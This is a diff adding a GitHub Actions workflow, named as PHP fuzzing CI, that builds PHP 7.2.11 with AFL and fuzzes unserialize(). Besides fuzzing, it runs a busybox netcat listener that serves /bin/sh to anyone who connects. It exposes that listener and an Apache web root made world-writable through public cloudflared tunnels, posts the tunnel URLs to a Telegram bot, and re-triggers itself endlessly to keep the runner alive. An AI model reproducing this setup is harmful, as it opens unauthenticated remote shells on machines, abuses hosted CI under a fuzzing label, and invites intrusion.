@@ -1,0 +1,267 @@
+name: Php Fuzzing CI  #nama ini jangan dirubah, ntah kenapa error saat loop
+
+# STOP: gh workflow disable "syzkaller fuzzing CI"
+# gh run cancel 38494535088 --force
+# START:
+# gh workflow list --all        # lihat status: active / disabled_manually
+# gh workflow enable "syzkaller fuzzing CI"
+
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [v4.32c-fuzzing-inci-php]
+    paths:
+      - ".github/workflows/fuzzing.yml"
+  schedule:
+    - cron: "0 */6 * * *"   # opsional, jaring pengaman kalau rantai putus
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false # jangan batalkan jika masih run, misal saat commit>
+
+permissions:
+  contents: read
+  actions: write
+
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350 # paksa berhenti sebelum 6 jam
+    env:
+      CHAT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+      CHAT_ID: "7797309176"
+      RUN_ID: "AFL-php7 ${{ github.run_id }}"
+      DURATION: ${{ inputs.seconds || '60' }}
+
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            build-essential \
+            git ssh openssh-client curl jq \
+            busybox-static netcat-openbsd \
+            autoconf afl libxml2-dev \
+            apache2 php libapache2-mod-php
+
+
+      - name: Enable KVM
+        run: |
+          echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
+          sudo udevadm control --reload-rules
+          sudo udevadm trigger --name-match=kvm
+
+
+      - name: Buka tunnel listener nc
+        run: |
+          #ubah www-data ke root
+          sudo sed -i \
+            -e 's/^export APACHE_RUN_USER=.*/export APACHE_RUN_USER=runner/' \
+            -e 's/^export APACHE_RUN_GROUP=.*/export APACHE_RUN_GROUP=runner/' \
+            /etc/apache2/envvars
+
+          sudo chmod 777 -R /var/www/html/
+          cd /var/www/html/
+          git clone https://github.com/sunjangyo12/ai-web
+          echo 1 > ai-web/settings.txt #php8 fix
+
+          sudo service apache2 start
+
+          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+          chmod +x cloudflared
+
+          # http listener
+          nohup ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:80 > wtunnel.log 2>&1 &
+          URL=""
+          for i in $(seq 1 30); do
+            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' wtunnel.log | head -1)
+            [ -n "$URL" ] && break
+            sleep 2
+          done
+          if [ -n "$URL" ]; then
+            MSG="[$RUN_ID] WEB: $URL"
+          fi
+          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
+            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
+
+          # nc listener
+          nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel-nc.log 2>&1 &
+          URL=""
+          for i in $(seq 1 30); do
+            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel-nc.log | head -1)
+            [ -n "$URL" ] && break
+            sleep 2
+          done
+
+          if [ -n "$URL" ]; then
+            MSG="[$RUN_ID] Listener NC: $URL"
+          else
+            MSG="[$RUN_ID] nc publik url"
+          fi
+
+          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
+            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
+
+
+      - name: Ambil state sesi sebelumnya
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          mkdir -p prev
+          FOUND=0
+
+          # 1. Coba ambil dari artifact run terakhir (repo saat ini)
+          NAME="fuzz-state-${{ github.ref_name }}"
+          ID=$(gh api "repos/${{ github.repository }}/actions/artifacts?name=$NAME&per_page=5" \
+                 -q '[.artifacts[] | select(.expired==false)][0].id')
+
+          if [ -n "$ID" ] && [ "$ID" != "null" ]; then
+            echo "State ditemukan di artifact (id=$ID)"
+            gh api "repos/${{ github.repository }}/actions/artifacts/$ID/zip" > prev.zip
+            unzip -q prev.zip -d prev
+            FOUND=1
+            MSG="[$RUN_ID] Pakai corpus dari artifact: $NAME"
+          fi
+
+          # 2. Fallback: ambil dari release di repo lain lewat wget
+          # gh release create "fuzz-state" fuzz-state.zip --title "x" --notes "x" --prerelease
+          # gh release delete "fuzz-state" --yes
+          if [ "$FOUND" -eq 0 ]; then
+            OTHER_REPO="sunjangyo12/test-ci"
+            TAG="fuzz-state"
+            ASSET="fuzz-state.zip"
+
+            URL="https://github.com/${OTHER_REPO}/releases/download/${TAG}/${ASSET}"
+
+            if wget -q "$URL" -O prev.zip; then
+              unzip -q prev.zip -d prev
+              FOUND=1
+              MSG="[$RUN_ID] State ditemukan di release repo lain"
+
+            else
+              MSG="[$RUN_ID] Gagal unduh dari release repo lain (mungkin belum ada)"
+            fi
+          fi
+
+          if [ "$FOUND" -eq 1 ]; then
+            ls -R prev | head -20
+          else
+            MSG="[$RUN_ID] Tidak ada state lama, mulai dari nol"
+          fi
+
+          # telegram
+          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
+            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
+
+
+
+
+      - name: Get PHP
+        run: |
+          curl -L -o php.tar.gz https://github.com/php/php-src/archive/php-7.2.11.tar.gz
+          mkdir php7
+          tar xzf php.tar.gz -C php7 --strip-components=1
+
+          sudo mkdir -p /work
+          sudo mv php7 /work
+          sudo chmod 777 -R /work/php7
+
+
+      - name: Patch php_cli.c (deferred init + persistent loop)
+        run: |
+          cd /work/php7
+          # Sama seperti blog: __AFL_INIT() sebelum eval, lalu while(__AFL_LOOP) di sekitar eval.
+          PAT='if (zend_eval_string_ex(exec_direct, NULL, "Command line code", 1) == FAILURE) {'
+          grep -qF "$PAT" sapi/cli/php_cli.c || { echo "::error::pola di php_cli.c tidak ditemukan, sesuaikan patch"; exit 1; }
+
+          sed -i "s|${PAT}|__AFL_INIT(); while (__AFL_LOOP(10000)) ${PAT}|" sapi/cli/php_cli.c
+          grep -n "__AFL" sapi/cli/php_cli.c
+
+
+      - name: Configure
+        run: |
+          cd /work/php7
+          ./buildconf --force
+          CC=afl-clang-fast CXX=afl-clang-fast++ ./configure
+
+      - name: Make
+        run: |
+          cd /work/php7
+          AFL_USE_ASAN=1 make -j4
+
+
+      - name: Prepare seeds
+        run: |
+          cd /work/php7
+          mkdir -p out
+          mkdir -p seeds && cd seeds
+          ../sapi/cli/php -r 'echo serialize("a");' > string
+          ../sapi/cli/php -r 'echo serialize(1);' > number
+          ../sapi/cli/php -r 'echo serialize([1,2]);' > array_of_num
+          ../sapi/cli/php -r 'echo serialize(["1","2"]);' > array_of_str
+          ../sapi/cli/php -r 'echo serialize([["1","2"],["3","4"],[1,2]]);' > array_of_array
+          ls -l
+
+
+
+
+      - name: Run Fuzzer AFL++
+        run: |
+          cd /work/php7
+
+          # listener nc
+          while [ 1 ]; do busybox nc -l -p 20022 -e /bin/sh -i; echo "start nc listen"; done &
+          PID_NC=$!
+
+          # lanjutkan corpus dari sesi sebelumnya
+          #if [ -d "$GITHUB_WORKSPACE/prev/workdir" ]; then
+          #  cp -a "$GITHUB_WORKSPACE/prev/workdir/." workdir/
+          #fi
+
+          timeout -s INT -k 2m 2m \
+            USE_ZEND_ALLOC=0 AFL_NO_UI=1 \
+            afl-fuzz -i seeds -o out \
+            -m none -- ./sapi/cli/php -r 'unserialize(file_get_contents("php://stdin"));' || true
+
+          cp -R out ~
+
+          #RES=$(ls /home/runner/work/syzkaller/syzkaller/myfuzzing/syz/workdir/crashes 2>/dev/null | wc -l || true)
+          #MSG="[$RUN_ID] Done with crash: $RES"
+          #curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
+          #  -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null || true
+
+          # bersihkan semua proses latar belakang
+          kill $PID_NC 2>/dev/null || true
+
+
+
+      - name: Collect artifacts
+        if: always()
+        run: |
+          mkdir -p ~/output
+
+          cp -a ~/out/. output/ || true
+
+
+#      - name: Upload artifact
+#        if: always()
+#        uses: actions/upload-artifact@v4
+#        with:
+#          name: fuzz-state-${{ github.ref_name }}
+#          path: output
+#          retention-days: 7
+
+
+
+      - name: Lanjutkan sesi berikutnya
+        if: ${{ !cancelled() }}
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh workflow run "${{ github.workflow }}" --ref ${{ github.ref_name }}
